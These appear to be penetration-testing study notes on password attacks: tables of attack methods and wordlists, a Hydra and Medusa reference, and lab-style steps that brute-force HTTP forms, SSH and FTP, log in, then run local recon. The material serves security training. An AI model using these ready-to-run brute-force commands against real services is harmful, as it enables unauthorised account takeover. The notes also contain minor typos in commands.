![[Pasted image 20250423174112.png]]

|Method|Description|Example|Best Used When...|
|---|---|---|---|
|`Simple Brute Force`|Systematically tries all possible combinations of characters within a defined character set and length range.|Trying all combinations of lowercase letters from 'a' to 'z' for passwords of length 4 to 6.|No prior information about the password is available, and computational resources are abundant.|
|`Dictionary Attack`|Uses a pre-compiled list of common words, phrases, and passwords.|Trying passwords from a list like 'rockyou.txt' against a login form.|The target will likely use a weak or easily guessable password based on common patterns.|
|`Hybrid Attack`|Combines elements of simple brute force and dictionary attacks, often appending or prepending characters to dictionary words.|Adding numbers or special characters to the end of words from a dictionary list.|The target might use a slightly modified version of a common password.|
|`Credential Stuffing`|Leverages leaked credentials from one service to attempt access to other services, assuming users reuse passwords.|Using a list of usernames and passwords leaked from a data breach to try logging into various online accounts.|A large set of leaked credentials is available, and the target is suspected of reusing passwords across multiple services.|
|`Password Spraying`|Attempts a small set of commonly used passwords against a large number of usernames.|Trying passwords like 'password123' or 'qwerty' against all usernames in an organization.|Account lockout policies are in place, and the attacker aims to avoid detection by spreading attempts across multiple accounts.|
|`Rainbow Table Attack`|Uses pre-computed tables of password hashes to reverse hashes and recover plaintext passwords quickly.|Pre-computing hashes for all possible passwords of a certain length and character set, then comparing captured hashes against the table to find matches.|A large number of password hashes need to be cracked, and storage space for the rainbow tables is available.|
|`Reverse Brute Force`|Targets a single password against multiple usernames, often used in conjunction with credential stuffing attacks.|Using a leaked password from one service to try logging into multiple accounts with different usernames.|A strong suspicion exists that a particular password is being reused across multiple accounts.|
|`Distributed Brute Force`|Distributes the brute forcing workload across multiple computers or devices to accelerate the process.|Using a cluster of computers to perform a brute-force attack significantly increases the number of combinations that can be tried per second.|The target password or key is highly complex, and a single machine lacks the computational power to crack it within a reasonable timeframe.|

|Wordlist|Description|Typical Use|Source|
|---|---|---|---|
|`rockyou.txt`|A popular password wordlist containing millions of passwords leaked from the RockYou breach.|Commonly used for password brute force attacks.|[RockYou breach dataset](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)|
|`top-usernames-shortlist.txt`|A concise list of the most common usernames.|Suitable for quick brute force username attempts.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)|
|`xato-net-10-million-usernames.txt`|A more extensive list of 10 million usernames.|Used for thorough username brute forcing.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)|
|`2023-200_most_used_passwords.txt`|A list of the 200 most commonly used passwords as of 2023.|Effective for targeting commonly reused passwords.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)|
|`Default-Credentials/default-passwords.txt`|A list of default usernames and passwords commonly used in routers, software, and other devices.|Ideal for trying default credentials.|[SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt)|

![[Pasted image 20250423175712.png]]
![[Pasted image 20250423175848.png]]

## Hydra
Hydra is a fast network login cracker that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including web applications, remote login services like SSH and FTP, and even databases.

**Installation :** `sudo apt-get -y install hydra`
**Usage :** `hydra [login_options] [password_options] [attack_options] [service_options]`

| Parameter               | Explanation                                                                                                | Usage Example                                                                                                   |
| ----------------------- | ---------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| `-l LOGIN` or `-L FILE` | Login options: Specify either a single username (`-l`) or a file containing a list of usernames (`-L`).    | `hydra -l admin ...` or `hydra -L usernames.txt ...`                                                            |
| `-p PASS` or `-P FILE`  | Password options: Provide either a single password (`-p`) or a file containing a list of passwords (`-P`). | `hydra -p password123 ...` or `hydra -P passwords.txt ...`                                                      |
| `-t TASKS`              | Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.           | `hydra -t 4 ...`                                                                                                |
| `-f`                    | Fast mode: Stop the attack after the first successful login is found.                                      | `hydra -f ...`                                                                                                  |
| `-s PORT`               | Port: Specify a non-default port for the target service.                                                   | `hydra -s 2222 ...`                                                                                             |
| `-v` or `-V`            | Verbose output: Display detailed information about the attack's progress, including attempts and results.  | `hydra -v ...` or `hydra -V ...` (for even more verbosity)                                                      |
| `service://server`      | Target: Specify the service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname.      | `hydra ssh://192.168.1.100`                                                                                     |
| `/OPT`                  | Service-specific options: Provide any additional options required by the target service.                   | `hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (for HTTP form-based authentication) |

| Hydra Service | Service/Protocol                 | Description                                                                                             | Example Command                                                                                                |
| ------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| ftp           | File Transfer Protocol (FTP)     | Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                             |
| ssh           | Secure Shell (SSH)               | Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.      | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                              |
| http-get/post | HTTP Web Services                | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.       | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| smtp          | Simple Mail Transfer Protocol    | Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.        | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                          |
| pop3          | Post Office Protocol (POP3)      | Targets email retrieval services to brute-force credentials for POP3 login.                             | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                               |
| imap          | Internet Message Access Protocol | Used to brute-force credentials for IMAP services, which allow users to access their email remotely.    | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                               |
| mysql         | MySQL Database                   | Attempts to brute-force login credentials for MySQL databases.                                          | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`                                            |
| mssql         | Microsoft SQL Server             | Targets Microsoft SQL servers to brute-force database login credentials.                                | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                              |
| vnc           | Virtual Network Computing (VNC)  | Brute-forces VNC services, used for remote desktop access.                                              | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                      |
| rdp           | Remote Desktop Protocol (RDP)    | Targets Microsoft RDP services for remote login brute-forcing.                                          | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                             |

**HTTP Authentication Brute-force :** `hydra -L usernames.txt -P passwords.txt www.example.com http-get`
**Targeting Multiple SSH Servers :** `hydra -l root -p toor -M targets.txt ssh`
 - In `targets.txt`, all IP Addresses for target are mentioned.
**Testing FTP Credentials on Non-standard Port :** `hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp`
**Brute-forcing Web Login Form :** `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
**Advanced RDP Brute-forcing :** `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`

## Basic HTTP Authentication
`curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt` : To download the wordlist

To use Hydra for the Authentication : `hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt <ip-address> http-get / -s <port_number>`

## Login Forms
`hydra [options] target http-post-form "path:params:condition_string"` : This is the template of the command.
`hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"` : This is the example of the string and it tell us the success condition (`S=...`)

Param-String : `/:username=^USER^&password=^PASS^:F=Invalid credentials`
1. `curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt`
2. `curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt`
3. `hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"`

> To download the above given password lists : `curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt` | `curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt`


## Medusa
To open the help documentation : `medusa -h`
To install the tool : `sudo apt-get -y install medusa`
Command syntax to be used : `medusa [target_options] [credential_options] -M module [module_options]`

|Parameter|Explanation|Usage Example|
|---|---|---|
|`-h HOST` or `-H FILE`|Target options: Specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`).|`medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...`|
|`-u USERNAME` or `-U FILE`|Username options: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`).|`medusa -u admin ...` or `medusa -U usernames.txt ...`|
|`-p PASSWORD` or `-P FILE`|Password options: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`).|`medusa -p password123 ...` or `medusa -P passwords.txt ...`|
|`-M MODULE`|Module: Define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`).|`medusa -M ssh ...`|
|`-m "MODULE_OPTION"`|Module options: Provide additional parameters required by the chosen module, enclosed in quotes.|`medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...`|
|`-t TASKS`|Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack.|`medusa -t 4 ...`|
|`-f` or `-F`|Fast mode: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`).|`medusa -f ...` or `medusa -F ...`|
|`-n PORT`|Port: Specify a non-default port for the target service.|`medusa -n 2222 ...`|
|`-v LEVEL`|Verbose output: Display detailed information about the attack's progress. The higher the `LEVEL` (up to 6), the more verbose the output.|`medusa -v 4 ...`|

## Medusa Modules
|Medusa Module|Service/Protocol|Description|Usage Example|
|---|---|---|---|
|FTP|File Transfer Protocol|Brute-forcing FTP login credentials, used for file transfers over a network.|`medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`|
|HTTP|Hypertext Transfer Protocol|Brute-forcing login forms on web applications over HTTP (GET/POST).|`medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^`|
|IMAP|Internet Message Access Protocol|Brute-forcing IMAP logins, often used to access email servers.|`medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`|
|MySQL|MySQL Database|Brute-forcing MySQL database credentials, commonly used for web applications and databases.|`medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`|
|POP3|Post Office Protocol 3|Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.|`medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`|
|RDP|Remote Desktop Protocol|Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.|`medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`|
|SSHv2|Secure Shell (SSH)|Brute-forcing SSH logins, commonly used for secure remote access.|`medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`|
|Subversion (SVN)|Version Control System|Brute-forcing Subversion (SVN) repositories for version control.|`medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`|
|Telnet|Telnet Protocol|Brute-forcing Telnet services for remote command execution on older systems.|`medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`|
|VNC|Virtual Network Computing|Brute-forcing VNC login credentials for remote desktop access.|`medusa -M vnc -h 192.168.1.100 -P passwords.txt`|
|Web Form|Brute-forcing Web Login Forms|Brute-forcing login forms on websites using HTTP POST requests.|`medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`|

Command to launch a brute-force attack against SSH service on given IP Address : `medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh `

Command to launch a Basic HTTP Authentication Attack : `medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET`

Command to test for empty or default passwords : `medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name`

## Web Services
To login into SSH Service where username is given and password is brute-forced using dictionary : `medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3`
Command for SSH to gain access : `ssh sshuser@<IP> -p PORT`

Targeting FTP Server : `medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5`  - Use this when into SSH Session of the Victim
To login into FTP Server : `ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost`
### Expanding the Attack Surface
To list all services and and open ports : `ntestat -tulpn | grep LISTEN`
For further recon, we can use : `nmap localhost`

